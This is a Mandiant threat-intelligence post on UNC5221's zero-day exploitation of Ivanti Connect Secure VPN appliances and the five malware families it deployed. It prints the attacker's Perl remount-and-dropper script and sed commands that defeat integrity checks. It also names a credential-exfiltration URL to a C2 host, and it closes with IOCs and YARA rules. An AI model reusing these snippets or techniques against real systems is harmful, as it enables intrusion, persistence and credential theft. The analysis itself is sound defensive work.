# Reference for threat actor for "UNC5221, UTA0178"

**Title**: Cutting Edge: Suspected APT Targets Ivanti Connect Secure VPN in New Zero-Day Exploitation | Mandiant

**Source**: https://www.mandiant.com/resources/blog/suspected-apt-targets-ivanti-zero-day

## Content
Cutting Edge: Suspected APT Targets Ivanti Connect Secure VPN in New Zero-Day Exploitation | Mandiant   Skip to main content Mandiant is now part of Google Cloud. Learn More.         Platform   Solutions   Intelligence   Services   Resources   Company Mandiant AdvantageExplore our multi-vendor XDR platform, delivering Mandiant products and integrating with a range of leading security operations technology.Explore the platformarrow_forward Who's targeting you   Attack Surface Management Map your external environment   Breach Analytics for Chronicle Know what we know when we know it   Security Validation Validate controls are working properly   Threat Intelligence Access latest intel from the frontlines   Digital Threat Monitoring Visibility into deep, dark, and open web   Managed Defense Managed detection and response Mandiant SolutionsSolve your toughest cyber security challenges with combinations of products and services.Featured solutionsarrow_forwardBy use casearrow_forwardBy industryarrow_forward  Featured solutions   Proactive Exposure Management New!Reduce exposures before adversaries act   Government New!Protect national services and agencies   Digital Risk ProtectionPrioritize and focus on threats that matter   RansomwareIncrease resilience against ransomware and multifaceted extortion   Know Who is Targeting YouPrioritize threats that matter most   Know What Is ExposedIdentify attack surface exposures   Know If You Are PreparedTest and measure your cyber defense program   Know If You Have Been BreachedDetect and respond to breach activity quickly and effectively   Use Case   RansomwareIncrease resilience against multifaceted extortion   Cyber Risk ManagementAdvance your business approach to cyber security   Digital Risk ProtectionPrioritize and focus on threats that matter   Industrial ControlsStrengthen OT and ICS security   Insider ThreatsUncover and manage internal vulnerabilities   Skills GapClose gaps with training and access to expertise   Private Industry   Finance New!Extend your security posture and operationalize resilience   Manufacturing New!Protect against cyber security threats to maintain business continuity   Government   Election SecurityFocus on Election Infrastructure Protection   Government  New!Protect natural services and agencies Mandiant ServicesMitigate threats, reduce risk, and get back to business with the help of leading experts.Learn morearrow_forwardView all services (47)arrow_forward Schedule a consultation   Featured categories   Cyber Security Transformation Establish and activate cyber defenses   Incident Response Tackle breaches confidently   Strategic Readiness Increase resilience to risk   Technical Assurance Test your security program   Expertise On Demand Access to Mandiant Experts   Training   Browse courses Browse on-demand and live training   Mandiant Academy Train your teams to protect effectively Cyber Threat IntelligenceMandiant specializes in cyber threat intelligence, offering products, services, and more to support our mission to defend against cyber crime. Intelligence resourcesarrow_forward  Products   Threat Intelligence Access latest intel from the frontlines   Digital Threat Monitoring visibility into deep, dark, and open web   Services   Intelligence capability development build a comprehensive threat intelligence program   Intelligence Training Develop practical application skills   Executive Briefings Get live, interactive briefings from the frontlines   Advanced Intelligence Access Hire a dedicated analyst for your needs Resource CenterGet the latest insights from cyber security experts at the frontlines of threat intelligence and incident responseM-Trends 2023 reportarrow_forwardmWISEarrow_forward View all resourcesarrow_forward   Resource types   Mandiant Blog Expert perspectives and industry news   Podcasts Interviews, hot topics, and more   Customer Stories Case studies and customer testimonials   Reports Research from the frontlines   Webinars Livestreams and pre-recorded speaker events   Insights Cyber security concepts, methods, and more   Events Upcoming conferences and collaboration   Infographics Visualization of security research and process   Datasheets Information on Mandiant offerings and more   eBooks High-impact cyber security guides   White Papers Cyber security insights and technical expertise CompanyLearn more about us and our mission to help organizations defend against cyber crime.Learn morearrow_forward Contact us   Careers Life at Mandiant and open roles   Media Center Press releases and news mentions   Partners Ecosystem and resources   Elevate Empowering women in cyber security   Mandiant Gives Back Our commitment to a better future              Sign in to Advantage  en  expand_more   English Français Deutsch Italiano 日本 한국어 EspañolGet Started        Search   Submit search form    Search   Submit search form  PlatformMandiant Advantage OverviewSecurity ValidationAttack Surface ManagementThreat IntelligenceDigital Threat MonitoringManaged DefenseSolutionsProactive Exposure ManagementGovernmentRansomwareKnow Who is Targeting YouKnow What Is ExposedKnow If You Are PreparedKnow If You Have Been BreachedCyber Risk ManagementDigital Risk ProtectionOT/ICS SecurityInsider ThreatsCyber Security Skills GapFinanceManufacturingElection SecurityIntelligenceIntelligence resourcesThreat IntelligenceDigital Threat MonitoringIntelligence Capability DevelopmentIntelligence TrainingExecutive BriefingsAdvanced Intelligence AccessServicesServices OverviewIncident ResponseStrategic ReadinessCyber Security TransformationTechnical AssuranceView all Services (48)Mandiant AcademyFind a CourseExpertise On DemandResourcesResourcesMandiant BlogsCustomer StoriesWebinarsEventsPodcastsReportsInsightsDatasheetsInfographicsWhite PaperseBooksCompanyAbout MandiantCareersMedia CenterPartnersElevateMandiant Gives BackMobile Footer SectionSee what’s new at MandiantGet startedIncident Response HelpContact SalesSupportBlogTop Incident Response Contact sales Support   BlogSupportContact usreport_problemIncident Response Assistance   Breadcrumb Home Cutting Edge: Suspected APT Targets Ivanti Connect Secure VPN in New Zero-Day Exploitation   Blog Cutting Edge: Suspected APT Targets Ivanti Connect Secure VPN in New Zero-Day ExploitationTyler McLellan, John Wolfram, Gabby Roncone, Matt Lin, Robert Wallace, Dimiter Andonov Jan 12, 20247 min read |    Last updated: Jan 31, 2024 MalwareIncident ResponseThreat IntelligenceespionageZero Day ThreatsUpdate (Jan. 31): We released a follow-up blog post containing additional details from our investigations into this threat, along with more recommendations for defenders.Note: This is a developing campaign under active analysis by Mandiant and Ivanti. We will continue to add more indicators, detections, and information to this blog post as needed.On January 10, 2024, Ivanti disclosed two vulnerabilities, CVE-2023-46805 and CVE-2024-21887, impacting Ivanti Connect Secure VPN (“CS”, formerly Pulse Secure) and Ivanti Policy Secure (“PS”) appliances. Successful exploitation could result in authentication bypass and command injection, leading to further downstream compromise of a victim network. Mandiant has identified zero-day exploitation of these vulnerabilities in the wild beginning as early as December 2023 by a suspected espionage threat actor, currently being tracked as UNC5221. Ivanti has been working closely with Mandiant, affected customers, government partners, and Volexity to address these issues. As part of their investigation, Ivanti has released a blog post and mitigations for the vulnerabilities exploited in this campaign to assist with determining if systems have been impacted. Patches are currently being developed and Ivanti customers are urged to follow the KB article to stay informed on target dates and releases. Mandiant is sharing details of five malware families associated with the exploitation of CS and PS devices. These families allow the threat actors to circumvent authentication and provide backdoor access to these devices. Additional post-exploitation tools have also been identified in our investigation and are highlighted further in this post. For even more analysis and technical details, register for our webinar on January 18, 2023 or watch it on demand following the presentation.Post Exploitation ActivityFollowing the successful exploitation of CVE-2023-46805 (authentication bypass) and CVE-2024-21887 (command injection), UNC5221 leveraged multiple custom malware families, in several cases trojanizing legitimate files within CS with malicious code. UNC5221 was also observed leveraging the PySoxy tunneler and BusyBox to enable post-exploitation activity. Due to certain sections of the device being read-only, UNC5221 leveraged a Perl script (sessionserver.pl) to remount the filesystem as read/write and enable the deployment of THINSPOOL, a shell script dropper that writes the web shell LIGHTWIRE to a legitimate Connect Secure file, and other follow-on tooling.use lib ($ENV{'DSINSTALL'} =~ /(\S*)/)[0] . "/perl";use DSSafe;system("mount -o remount,rw /");system("chmod a+x /home/etc/sql/dsserver/sessionserver.sh");system("/home/etc/sql/dsserver/sessionserver.sh 1>/dev/null 2>/tmp/errlog");system("mount -o remount,ro /");Mandiant has determined that THINSPOOL acts as a key tool for both persistence and detection evasion, in addition to being the initial dropper for the LIGHTWIRE web shell used by UNC5221 for post-exploitation activity. The LIGHTWIRE and WIREFIRE web shells used by UNC5221, post-compromise, are lightweight footholds enabling further and continued access to the CS appliances. This indicates that these are not opportunistic attacks, and UNC5221 intended to maintain its presence on a subset of high priority targets that it compromised after a patch was inevitably released. Additionally, the WARPWIRE Javascript credential stealer may also enable further access to accounts for lateral movement or espionage by capturing plaintext login credentials.  Custom Malware Identified ZIPLINE Passive BackdoorZIPLINE is a passive backdoor that hijacks an exported function, accept(), from the file libsecure.so. When ZIPLINE invokes the hijacked accept() function, it first resolves the benign accept() from libc, to intercept network traffic. Once an incoming connection is registered, it is first processed by the benign libc_accept, and ZIPLINE then checks if the process name is “web”. The malware retrieves up to 21 bytes from the connected host, verifying if the received buffer corresponds to the string “SSH-2.0-OpenSSH_0.3xx.”  If so, the malicious functionality of ZIPLINE is triggered. ZIPLINE will then receive an encrypted header which specifies the command to be executed. Further details about this hijacking technique for the accept() function can be found in this SecureIdeas post.ZIPLINE supports the following commands:Command IDOperationDescription1File UploadThe command contains the path of the file to be sent to the connected host.2File DownloadThe command contains the file path and its content to be saved on the compromised system.3Reverse ShellA reverse shell is created using /bin/sh and the provided command is executed4Proxy ServerCreates a proxy server with an IP address provided as part of the command.5Tunneling ServerImplements a tunneling server, capable of simultaneously dispatching traffic between multiple endpoints.Upon initialization, ZIPLINE copies /etc/ld.so.preload to /tmp/data/root/etc/ld.so.preload, which will be executed if the process name is “dspkginstall”. ZIPLINE then copies itself to /tmp/data/root/home/lib.Upon termination ZIPLINE first checks if the process name is tar. If the process name is tar, the malware executes different functionalities based on the provided parameters: -xzf, --exclude, or ./installer.If the parameter --exclude is used, ZIPLINE will add itself to the CS exclusion_list. The exclusion_list is part of the Ivanti Integrity Checker Tool and Mandiant assesses this is a measure implemented by the attacker to evade detection. If the parameter -xzf is used, ZIPLINE computes its own SHA256 hash, formats the line <sha256>  ./root<self_fpath>, and then appends this string to each file within the ./installer/bom_files directory. This is achieved using the command: echo <formatted_sha256_string> >> ./installer/bom_files/<file_name>.If the parameter ./installer is used,  ZIPLINE deletes specific lines from /pkg/do-install and ./installer/do-install. To do so, it executes the following sed commands:sed -i '/retval=$(exec $installer $@)/d' /pkg/do-install sed -i '/exit $?/d' /pkg/do-install sed -i '/retval=$(exec $installer $@)/d' ./installer/do-install sed -i '/exit $?/d' ./installer/do-install THINSPOOL DropperTHINSPOOL is a dropper written in shell script that writes the web shell LIGHTWIRE to a legitimate CS file. THINSPOOL will re-add the malicious web shell code to legitimate files after an update, allowing UNC5221 to persist on the compromised devices. THINSPOOL attempts to evade Ivanti’s Integrity Checker but Mandiant observed this attempt failed.LIGHTWIRE and WIREFIRE Web ShellsLIGHTWIRE is a web shell written in Perl CGI that is embedded into a legitimate Secure Connect file to enable arbitrary command execution. LIGHTWIRE intercepts requests to compcheckresult.cgi that contain the parameters “comp=comp” and “compid”, where “compid” contains Base64-encoded and RC4-encrypted ciphertext. The decoded cleartext is interpreted and executed as Perl code.WIREFIRE is a web shell written in Python that exists as trojanized logic to a component of the Connect Secure appliance. WIREFIRE supports downloading files to the compromised device and executing arbitrary commands. It contains logic inserted before authentication that responds to specific HTTP POST requests to /api/v1/cav/client/visits. If formdata entry “file” exists, the web shell saves the content to the device with a specified filename; if not, the web shell attempts to decode, decrypt, and zlib decompress any raw data existing after a GIF header to execute as a subprocess. The output of the executed process will be zlib compressed, AES-encrypted with the same key, and Base64-encoded before being sent back as JSON with a “message” field via an HTTP 200 OK.WARPWIRE Credential HarvesterWARPWIRE is a credential harvester written in Javascript that is embedded into a legitimate Connect Secure file. WARPWIRE targets plaintext passwords and usernames which are submitted via a HTTP GET request to a command and control (C2) server.WARPWIRE captures credentials submitted during the web logon to access layer 7 applications, like RDP. Captured credentials are Base64-encoded with btoa() before they are submitted to the C2 via a HTTP GET request.hxxps://symantke[.]com/?<username>&<password>AttributionAt the time of publication, Mandiant had not linked this activity to a previously known group, nor do we currently have enough data to assess the origin of this threat actor. UNC5221 was created to track this suspected espionage actor. The targeting of edge infrastructure with zero-day vulnerabilities has been a consistent tactic leveraged by espionage actors to enable their operations. Additionally, Mandiant has previously observed multiple suspected APT actors utilizing appliance specific malware to enable post-exploitation and evade detection. These instances, combined with Volexity’s findings around targeting, leads Mandiant to suspect this is an espionage-motivated APT campaign. UNC5221 primarily used compromised out-of-support Cyberoam VPN appliances for C2. These compromised devices were domestic to the victims, which likely helped the threat actor to better evade detection.Conclusion & RecommendationsUNC5221’s activity demonstrates that exploiting and living on the edge of networks remains a viable and attractive target for espionage actors. As we have previously reported, the combination of zero-day exploitation, edge device compromise, use of compromised C2 infrastructure, and detection evasion methods such as writing code to legitimate files have become a hallmark of espionage actors’ toolboxes.We recommend following the guidance outlined in the Ivanti blog post on this activity. Ivanti customers are urged to implement mitigation as soon as possible and to follow the post for upcoming patch release schedules. Details about Ivanti’s Integrity Checker Tool (ICT) are also available.AcknowledgementWe would like to thank the team at Ivanti for their partnership and support in this investigation. Additionally, this analysis would not have been possible without the assistance from people across Mandiant Intelligence, Consulting, and FLARE as well as our colleagues on Google TAG. We would like to specifically acknowledge Aseel Kayal and Nick Simonian from Mandiant’s Adversary Methods Research and Discovery (RAD) team for their support of this investigation.Indicators of Compromise (IOCs)Code FamilyFilenameDescriptionLIGHTWIREcompcheckresult.cgiWeb shellTHINSPOOLsessionserver.shWeb shell dropperWARPWIRElastauthserverused.jsCredential harvesterWIREFIREvisits.pyWeb shellTHINSPOOL Utilitysessionserver.plScriptZIPLINElibsecure.so.1Passive backdoorNetwork-Based Indicators (NBIs)symantke[.]comWARPWIRE C2YARA Rulesrule M_Hunting_Backdoor_ZIPLINE_1 {  meta:    author = "Mandiant"    description = "This rule detects unique strings in ZIPLINE, a passive ELF backdoor that waits for incoming TCP connections to receive commands from the threat actor."  strings:    $s1 = "SSH-2.0-OpenSSH_0.3xx" ascii    $s2 = "$(exec $installer $@)" ascii    $t1 = "./installer/do-install" ascii    $t2 = "./installer/bom_files/" ascii    $t3 = "/tmp/data/root/etc/ld.so.preload" ascii    $t4 = "/tmp/data/root/home/etc/manifest/exclusion_list" ascii  condition:    uint32(0) == 0x464c457f and    filesize < 5MB and    ((1 of ($s*)) or    (3 of ($t*)))}rule M_Hunting_Dropper_WIREFIRE_1 {  meta:    author = "Mandiant"    description = "This rule detects WIREFIRE, a web shell written in Python that exists as trojanized logic to a component of the pulse secure appliance."    md5 = "6de651357a15efd01db4e658249d4981"  strings:    $s1 = "zlib.decompress(aes.decrypt(base64.b64decode(" ascii    $s2 = "aes.encrypt(t+('\\x00'*(16-len(t)%16))" ascii    $s3 = "Handles DELETE request to delete an existing visits data." ascii    $s4 = "request.data.decode().startswith('GIF'):" ascii    $s5 = "Utils.api_log_admin" ascii  condition:    filesize < 10KB    and all of them}rule M_Hunting_Webshell_LIGHTWIRE_2 {  meta:    author = "Mandiant"    description = "Detects LIGHTWIRE based on the RC4 decoding and execution 1-liner."    md5 = "3d97f55a03ceb4f71671aa2ecf5b24e9"  strings:    $re1 = /eval\{my.{1,20}Crypt::RC4->new\(\".{1,50}->RC4\(decode_base64\(CGI::param\(\'.{1,30};eval\s\$.{1,30}\"Compatibility\scheck:\s\$@\";\}/  condition:    filesize < 10KB    and all of them}rule M_Hunting_Dropper_THINSPOOL_1 {  meta:    author = "Mandiant"    description = "This rule detects THINSPOOL, a dropper that installs the LIGHTWIRE web shell onto a Pulse Secure system."    md5 = "677c1aa6e2503b56fe13e1568a814754"  strings:    $s1 = "/tmp/qactg/" ascii    $s2 = "echo '/home/config/dscommands'" ascii    $s3 = "echo '/home/perl/DSLogConfig.pm'" ascii    $s4 = "ADM20447" ascii  condition:    filesize < 10KB    and all of them}rule M_Hunting_CredTheft_WARPWIRE_1{  meta:    author = "Mandiant"    description = "This rule detects WARPWIRE, a credential stealer written in Javascript that is embedded into a legitimate Pulse Secure file."    md5 = "d0c7a334a4d9dcd3c6335ae13bee59ea"  strings:    $s1 = {76 61 72 20 77 64 61 74 61 20 3d 20 64 6f 63 75 6d 65 6e 74 2e 66 72 6d 4c 6f 67 69 6e 2e 75 73 65 72 6e 61 6d 65 2e 76 61 6c 75 65 3b}    $s2 = {76 61 72 20 73 64 61 74 61 20 3d 20 64 6f 63 75 6d 65 6e 74 2e 66 72 6d 4c 6f 67 69 6e 2e 70 61 73 73 77 6f 72 64 2e 76 61 6c 75 65 3b}    $s3 = {2b 77 64 61 74 61 2b 27 26 27 2b 73 64 61 74 61 3b}    $s4 = {76 61 72 20 78 68 72 20 3d 20 6e 65 77 20 58 4d 4c 48 74 74 70 52 65 71 75 65 73 74}    $s5 = "Remember the last selected auth realm for 30 days" ascii  condition:   filesize < 8KB and all of them} Link to RSS feedPrepare for 2024's cybersecurity landscape.Get the Google Cloud Cybersecurity Forecast 2024 report to explore the latest trends on the horizon. Download now  Have questions? Let's talk.Mandiant experts are ready to answer your questions. Contact Us  Follow us Footer Mandiant Advantage Platform Platform Overview Security Validation Attack Surface Management Threat Intelligence Digital Threat Monitoring Managed Defense Solutions Proactive Exposure Management Ransomware Industrial Controls & OT Cyber Risk Management Digital Risk Protection Insider Threats Cyber Security Skills Gap Election Security Government Cyber Security Manufacturing Cyber Threat Visibility Attack Surface Visibility Cyber Preparedness Detection and Response Financial Services Cyber Security Services Services Overview Incident Response Strategic Readiness Cyber Security Transformation Technical Assurance View all Services (48) Expertise on Demand Mandiant Academy Overview Education Formats Upcoming Courses On-Demand Courses Certifications ThreatSpace Cyber Range Free Course Sneak Peaks Resources Resource Center Blog Podcasts  Customer Stories Reports Webinars Insights eBooks Infographics White Papers Datasheets Company About Us Careers Events Media Center Partners Partners Overview Technology Partners Cyber Risk Partners Service Partners Channel Partners Partner Portal Connect with Mandiant Contact Us Report an Incident Customer Support Customer Success Media Inquiries © Copyright 2024 Mandiant. All rights reserved.Bottom Website Privacy Policy Terms & Conditions Compliance Site Map  